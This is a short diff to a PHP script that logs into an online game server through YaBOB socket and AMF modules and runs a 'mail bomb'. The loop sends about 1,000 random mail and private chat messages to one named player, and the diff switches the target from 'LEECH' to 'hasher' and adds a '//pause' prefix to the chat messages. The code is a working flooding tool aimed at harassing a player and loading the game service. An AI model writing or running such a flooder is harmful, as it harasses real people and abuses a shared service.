@@ -12,7 +12,7 @@ require_once('YaBOB/Handshake.php');
 require_once('YaBOB/common/Createnewplayer.php');
 require_once('YaBOB/common/Privatechat.php');
 require_once('YaBOB/Mail/Sendmail.php');
-require_once('config.php')
+require_once('config.php');
 
 $s = new Socket\Client($address,$port);
 
@@ -55,8 +55,8 @@ else if(@$response->data['errorMsg'] === "need create player"){
 	$in = $s->read();
 	//var_dump($in);
 } else {
-	echo $response->data['errorMsg'];
-	//exit;
+	echo 'server returned: '.$response->data['errorMsg'];
+	exit;
 }
 //$s->read();
 	//var_dump($response);
@@ -70,8 +70,8 @@ echo "Starting mail bomb\n";
 for($i = 0; $i <=1000; $i++)
 {
 	$message = bin2hex(mcrypt_create_iv(50));
-	$mailMessage = $mail->_($message, "LEECH", "Hello");
-	$chatMessage = $chat->_("LEECH",$message);
+	$mailMessage = $mail->_($message, "hasher", "Hello");
+	$chatMessage = $chat->_("hasher","//pause ".$message);
 	$mailData = $AMF->AMFlength($mailMessage).$mailMessage;
 	$chatData = $AMF->AMFlength($chatMessage).$chatMessage;
 	$s->write($mailData);
@@ -81,4 +81,4 @@ for($i = 0; $i <=1000; $i++)
 	$out = $AMF->destructAMF($out);
 	echo "Sent ".$i." mails\n";
 }
-var_dump($out);
+//var_dump($out);
